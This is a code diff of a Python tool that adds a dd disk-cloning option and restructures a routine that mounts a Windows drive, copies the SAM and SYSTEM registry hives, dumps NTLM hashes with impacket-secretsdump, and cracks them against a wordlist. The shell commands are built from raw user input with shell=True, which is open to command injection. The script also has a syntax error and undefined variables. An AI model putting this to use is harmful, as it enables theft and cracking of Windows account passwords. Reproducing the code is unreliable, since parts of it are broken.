@@ -1,5 +1,12 @@
 import hashlib, binascii, os, subprocess
 
+def clone():
+    inputfile = input("Enter Path to your Disk: ")
+    outputfile = input("(include .img ) Enter Name of New Image file: ")
+    blocksize = input("(Example: 3M) Enter Desired Block Size: ")
+ 
+    subprocess.call("sudo dd if=" + inputfile + " of=" + outputfile + " bs=" + blocksize + " conv=noerror status=progress", shell=True)
+
 def mkdir():
     os.chdir("/mnt/")
     print("[+] Directory Changed To /mnt/")
@@ -22,47 +29,52 @@ def animal():
         else:
             return False
 
-    os.chdir("/mnt/")
-    directory = input("Confirm Name of Your Directory: ")
-    print("..............................................") 
-    subprocess.call("sudo fdisk -l")
-    print("..............................................")
-    windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
-    subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
-    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
-    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
-    subprocess.call("sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL > targethashes.txt", shell=True)
-    subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
-    subprocess.call("sudo nano targethashes.txt", shell=True)
+    choice = input("Enter (Y) Create Disk Image (N) Continue: ")
 
-    with open("targethashes.txt"), "r") as input_file:
-        input_hash = input_file.readline()
+    if choice == "Y":
+        clone()
+    elif choice == "N":
+        os.chdir("/mnt/")
+        directory = input("Confirm Name of Your Directory: ")
+        print("..............................................") 
+        subprocess.call("sudo fdisk -l")
+        print("..............................................")
+        windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
+        subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
+        subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
+        subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
+        subprocess.call("sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL > targethashes.txt", shell=True)
+        subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
+        subprocess.call("sudo nano targethashes.txt", shell=True)
 
-    with open(input("Enter Path to Your Password List: "), "r", errors="ignore") as password_list:
+        with open("targethashes.txt"), "r") as input_file:
+            input_hash = input_file.readline()
+
+        with open(input("Enter Path to Your Password List: "), "r", errors="ignore") as password_list:
         
-        for line in password_list:
+            for line in password_list:
+                if cracked:
+                    break
+
+                else:
+                    password_guess = line.rstrip()
+                    ntlm_hash = coverted_ntlm(password_guess)
+
+                    print(f"GUESSES: {guesses}", end="\r")
+
+                    if match_hashes(input_hash, ntlm_hash):
+                        cracked = True
+
+                    guesses += 1
+
             if cracked:
-                break
-
-            else:
-                password_guess = line.rstrip()
-                ntlm_hash = coverted_ntlm(password_guess)
-
-                print(f"GUESSES: {guesses}", end="\r")
-
-                if match_hashes(input_hash, ntlm_hash):
-                    cracked = True
-
-                guesses += 1
-
-        if cracked:
-            print(f"PASSWORD FOUND: {password_guess}")
-            subprocess.call("sudo rm -f targethashes.txt", shell=True)
+                print(f"PASSWORD FOUND: {password_guess}")
+                subprocess.call("sudo rm -f targethashes.txt", shell=True)
             
-        else:
-            print(f"NO PASSWORD FOUND OUT OF {guesses} GUESSES")
-            subprocess.call("sudo rm -f targethashes.txt", shell=True)
-            subprocess.call("sudo umount " + windows_harddrive, shell=True) 
+            else:
+                print(f"NO PASSWORD FOUND OUT OF {guesses} GUESSES")
+                subprocess.call("sudo rm -f targethashes.txt", shell=True)
+                subprocess.call("sudo umount " + windows_harddrive, shell=True) 
 
 
 def main():
